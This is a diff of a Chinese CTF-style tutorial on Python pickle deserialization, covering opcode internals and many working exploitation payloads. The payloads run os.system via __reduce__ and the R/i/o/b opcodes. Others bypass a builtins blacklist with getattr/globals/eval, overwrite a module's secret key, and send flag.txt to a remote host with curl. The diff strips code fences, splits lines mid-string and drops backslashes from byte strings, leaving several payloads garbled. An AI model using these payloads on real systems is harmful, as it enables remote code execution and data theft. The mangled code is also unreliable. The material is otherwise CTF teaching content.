@@ -181,20 +181,18 @@ ATT&CK中的攻与防——T1059
 ```
 pickle.dump(obj, file)
 //将obj对象进行封存，即序列化，然后写入到file文件中
-//注:这里的file需要以wb打开(二进制可写模式)
+//注:
+这里的file需要以wb打开(二进制可写模式)
 pickle.load(file)
 //将file这个文件进行解封，即反序列化
-//注:这里的file需要以rb打开(二进制可读模式)
+//注:
+这里的file需要以rb打开(二进制可读模式)
 pickle.dumps(obj)
 //将obj对象进行封存，即序列化，然后将其作为bytes类型直接返回
 pickle.loads(data)
 //将data解封，即进行反序列化
-//注:data要求为bytes-like object(字节类对象)
-```
-
-
-
-```
+//注:
+data要求为bytes-like object(字节类对象)
 import pickle
 
 zj = 'tttang'
@@ -210,11 +208,6 @@ with open(filename, "rb") as f:
 # 反序列化
 with open(filename, "rb") as f: #以二进制可读形式打开tttang这个文件
     print(pickle.load(f)) #将这个文件进行反序列化并输出
-```
-
-
-
-```
 try:
             while True:
                 key = read(1)
@@ -222,68 +215,29 @@ try:
                     raise EOFError
                 assert isinstance(key, bytes_types)
                 dispatch[key[0]](self)
-        except _Stop as stopinst:
+        
+except _Stop as stopinst:
             return stopinst.value
-```
-
-
-
-```
 b'x80x04x95nx00x00x00x00x00x00x00x8cx06tttangx94.'
-```
-
-
-
-```
 def load_proto(self):
         proto = self.read(1)[0]
         if not 0 <= proto <= HIGHEST_PROTOCOL:
             raise ValueError("unsupported pickle protocol: %d" % proto)
         self.proto = proto
-```
-
-
-
-```
 FRAME            = b'x95'  # indicate the beginning of a new frame
-```
-
-
-
-```
 def load_frame(self):
         frame_size, = unpack('<Q', self.read(8))
         if frame_size > sys.maxsize:
             raise ValueError("frame size > sys.maxsize: %d" % frame_size)
         self._unframer.load_frame(frame_size)
-```
-
-
-
-```
 def load_short_binunicode(self):
         len = self.read(1)[0]
         self.append(str(self.read(len), 'utf-8', 'surrogatepass'))
-```
-
-
-
-```
 self.stack = []
 self.append = self.stack.append
-```
-
-
-
-```
 def load_memoize(self):
         memo = self.memo
         memo[len(memo)] = self.stack[-1]
-```
-
-
-
-```
 import pickle
 
 class tttang:
@@ -292,97 +246,23 @@ class tttang:
         self.age=age
 a=pickle.dumps(tttang("quan9i","19"))
 print(a)
-```
-
-
-
-```
-b'x80x04x95:x00x00x00x00x00x00x00x8cx08__main__x94x8cx06tttangx94x93x94)x81x94}x94(x8cx04namex94x8cx06quan9ix94x8cx03agex94x8cx0219x94ub.'
-```
-
-
-
-```
+b'x80x04x95:
+x00x00x00x00x00x00x00x8cx08__main__x94x8cx06tttangx94x93x94)x81x94}x94(x8cx04namex94x8cx06quan9ix94x8cx03agex94x8cx0219x94ub.'
 stack:[__main__]
-```
-
-
-
-```
 stack:[__main__,tttang]
-```
-
-
-
-```
 stack:[<class '__main__.tttang'>]
-```
-
-
-
-```
 stack:[<class '__main__.tttang'>,()]
-```
-
-
-
-```
 stack:[<class '__main__.tttang'>]
-```
-
-
-
-```
 stack:[<class '__main__.tttang'>,{}]
-```
-
-
-
-```
 stack:[name]
-```
-
-
-
-```
 stack:[name,quan9i]
-```
-
-
-
-```
 stack:[name,quan9i,age]
-```
-
-
-
-```
 stack:[name,quan9i,age,19]
-```
-
-
-
-```
 __main__.tttang[items[0]]=items[1]
 __main__.tttang[items[2]]=items[3]
-```
-
-
-
-```
 __main__.tttang[name]=quan9i
 __main__.tttang[age]=19
-```
-
-
-
-```
 stack:[<class '__main__.tttang'>,{'name':'quan9i','age':'19'}]
-```
-
-
-
-```
 import pickle
 import pickletools
 class tttang:
@@ -392,27 +272,12 @@ class tttang:
 a=pickle.dumps(tttang("quan9i","19"))
 print(a)
 pickletools.dis(a)
-```
-
-
-
-```
 key='flag{xxx}'
-```
-
-
-
-```
 c__main__
 secret
 (S'key'
 S'tttang'
 db.
-```
-
-
-
-```
 import pickle
 import secret
 
@@ -428,21 +293,13 @@ output=pickle.loads(payload.encode())
 
 print('output:',output)
 print('after:',secret.key)
-```
-
-
-
-```
 __reduce__
-调用:被定义之后，当对象被pickle时就会触发
-作用:如果接收到的是字符串，就会把这个字符串当成一个全局变量的名称，然后Python查找它并进去pickle
+调用:
+被定义之后，当对象被pickle时就会触发
+作用:
+如果接收到的是字符串，就会把这个字符串当成一个全局变量的名称，然后Python查找它并进去pickle
     如果接收到的是元组，这个元组应该包含2-6个元素，其中包括：一个可调用对象，用于创建对象，参数元素，供对象调用
-```
-
-
-
-```
-#encoding: utf-8
+    #encoding: utf-8
 import os
 import pickle
 class tttang(object):
@@ -452,11 +309,6 @@ a=tttang()
 payload=pickle.dumps(a)
 print(payload)
 pickle.loads(payload)
-```
-
-
-
-```
 import pickle
 import os
 
@@ -468,93 +320,38 @@ class tttang(object):
 
 a = tttang()
 pickle.loads(pickle.dumps(a))
-```
-
-
-
-```
 def load_reduce(self):
         stack = self.stack
         args = stack.pop()
         func = stack[-1]
         stack[-1] = func(*args)
-```
-
-
-
-```
 a=b'cosnsystemnXx06x00x00x00whoamix85R.'
-```
-
-
-
-```
 import pickle
 a=b'cosnsystemnXx06x00x00x00whoamix85R.'
 flag=pickle.loads(a)
-```
-
-
-
-```
 def load_inst(self):
         module = self.readline()[:-1].decode("ascii")
         name = self.readline()[:-1].decode("ascii")
         klass = self.find_class(module, name)
         self._instantiate(klass, self.pop_mark())
-```
-
-
-
-```
 def pop_mark(self):
         items = self.stack
         self.stack = self.metastack.pop()
         self.append = self.stack.append
         return items
-```
-
-
-
-```
 b'(Xx06x00x00x00whoamiiosnsystemn.'
-```
-
-
-
-```
 import pickle
 a=b'(Xx06x00x00x00whoamiiosnsystemn.'
 b=pickle.loads(a)
-```
-
-
-
-```
 def load_obj(self):
         # Stack is ... markobject classobject arg1 arg2 ...
         args = self.pop_mark()
         cls = args.pop(0)
         self._instantiate(cls, args)
-```
-
-
-
-```
 b'(cosnsystemnXx06x00x00x00whoamio.'
-```
-
-
-
-```
 import pickle
 a=b'(cosnsystemnXx06x00x00x00whoamio.'
 b=pickle.loads(a)
-```
-
-
-
-```
 def load_build(self):
         stack = self.stack
         state = stack.pop()
@@ -577,28 +374,13 @@ def load_build(self):
         if slotstate:
             for k, v in slotstate.items():
                 setattr(inst, k, v)
-```
-
-
-
-```
 b'c__main__ntttangn)x81}Xx0Cx00x00x00__setstate__cosnsystemnsbXx06x00x00x00whoamib.'
-```
-
-
-
-```
 import pickle
 class tttang:
     def __init__(self):
             self.name="quan9i"
 a=b'c__main__ntttangn)x81}Xx0Cx00x00x00__setstate__cosnsystemnsbXx06x00x00x00whoamib.'
 b=pickle.loads(a)
-```
-
-
-
-```
 import pickle
 import io
 import builtins
@@ -609,30 +391,10 @@ class RestrictedUnpickler(pickle.Unpickler):
         if module == "builtins" and name not in self.blacklist:
             return getattr(builtins,name)
         raise pickle.UnpicklingError("global '%s.%s' is forbidden"%(module ,name))
-```
-
-
-
-```
 builtins.getattr(builtins, 'eval'),('__import__("os").system("whoami")',)
-```
-
-
-
-```
 cbuiltins
 getattr
-```
-
-
-
-```
 builtins = builtins.globals().get('builtins')
-```
-
-
-
-```
 cbuiltins
 globals  #得到builtins.globals
 cbuiltins
@@ -641,11 +403,6 @@ getattr
 dict
 S'get'
 tR.   #获取到globals中的dict类中的get方法
-```
-
-
-
-```
 cbuiltins
 getattr
 (cbuiltins
@@ -655,11 +412,6 @@ tR(cbuiltins
 globals   #得到globals()
 (tRS'builtins' #读取builtins
 tR. #t是与(形成元组，R是执行，师傅们自行解读一下可以就理解了
-```
-
-
-
-```
 import pickle,builtins
 
 payload=b"""cbuiltins
@@ -674,11 +426,6 @@ tR.
 """
 a=pickle.loads(payload)
 print(a)
-```
-
-
-
-```
 b"""cbuiltins
 getattr
 (cbuiltins
@@ -693,84 +440,39 @@ tRS'eval'
 tRp1
 (S'__import__("os").system("whoami")'
 tR."""
-```
-
-
-
-```
 o操作码：
 b'x80x03(cbuiltinsngetattrnp0ncbuiltinsndictnp1nXx03x00x00x00getop2n0(g2n(cbuiltinsnglobalsnoXx0Cx00x00x00__builtins__op3n(g0ng3nXx04x00x00x00evalop4n(g4nXx21x00x00x00__import__("os").system("whoami")o.'
-```
-
-
-
-```
 c__main__
 secret
 (S'key'
 S'tttang'
 db.
-```
-
-
-
-```
 c__main__
 secret
 (Vu006bey
 S'tttang'
 db.
-```
-
-
-
-```
 c__main__
 secret
 (S'x6bey'
 S'tttang'
 db.
-```
-
-
-
-```
 import secret
 import sys
 print(dir(sys.modules['secret']))
-```
-
-
-
-```
 import secret
 import sys
 print(next(reversed(dir(sys.modules['secret']))))
-```
-
-
-
-```
 (c__main__
 secret
 i__builtin__
 dir
-```
-
-
-
-```
 ((c__main__
 secret
 i__builtin__
 dir
 i__builtin__
 reversed
-```
-
-
-
-```
 (((c__main__
 secret
 i__builtin__
@@ -779,11 +481,6 @@ i__builtin__
 reversed
 i__builtin__
 next
-```
-
-
-
-```
 import secret
 import pickle
 import sys
@@ -797,11 +494,6 @@ i__builtin__
 next
 .'''
 print(pickle.loads(opcode))
-```
-
-
-
-```
 import pickle
 import secret
 
@@ -823,11 +515,6 @@ output=pickle.loads(payload)
 
 print('output:',output)
 print('after:',secret.key)
-```
-
-
-
-```
 import time
 import requests
 url = "http://8e197801-2f87-4e36-aee6-a2390b0f391e.node4.buuoj.cn:81/shop?page="
@@ -837,11 +524,6 @@ for i in range(1,300):
     if "lv6.png" in res.text:
         print(i)
         break
-```
-
-
-
-```
 import pickle
 import urllib
 import commands
@@ -852,11 +534,6 @@ class flag(object):
 
 a = flag()
 print(urllib.quote(pickle.dumps(a)))
-```
-
-
-
-```
 import pickle
 import urllib
 import commands
@@ -867,32 +544,12 @@ class flag(object):
 
 a = flag()
 print(urllib.quote(pickle.dumps(a)))
-```
-
-
-
-```
 gAN9cQAoWAUAAABtb25leXEBTYYBWAcAAABoaXN0b3J5cQJdcQMoWBQAAABZdW1teSBzbcO2cmfDpXNndXJrYXEEWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBWVYEAAAAGFudGlfdGFtcGVyX2htYWNxBlggAAAAMjllYTdlODgyODJmOTJmNGZmYzI5NzZmMTQ5MDU2OTdxB3Uu
-```
-
-
-
-```
 import pickle
 from base64 import *
 a='gAN9cQAoWAUAAABtb25leXEBTYYBWAcAAABoaXN0b3J5cQJdcQMoWBQAAABZdW1teSBzbcO2cmfDpXNndXJrYXEEWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBWVYEAAAAGFudGlfdGFtcGVyX2htYWNxBlggAAAAMjllYTdlODgyODJmOTJmNGZmYzI5NzZmMTQ5MDU2OTdxB3Uu'
 print(pickle.loads(b64decode(a)))
-```
-
-
-
-```
 {'money': 390, 'history': ['Yummy smörgåsgurka', 'Yummy standard pickle'], 'anti_tamper_hmac': '29ea7e88282f92f4ffc2976f14905697'}
-```
-
-
-
-```
 import base64
 import pickle
 
@@ -901,17 +558,13 @@ class flag(object):
         return (eval, ("__import__('os').system('cat /f*')",))
 a = flag()
 print( base64.b64encode( pickle.dumps(a) ) )
-```
-
-
-
-```
 import base64
 import pickle
 
 class payload(object):
     def __reduce__(self):
-        return (eval,("__import__('os').system('curl -d @flag.txt  ip:7777')",))
+        return (eval,("__import__('os').system('curl -d @flag.txt  ip:
+7777')",))
 a = payload()
 print(base64.b64encode(pickle.dumps(a)))
 ```
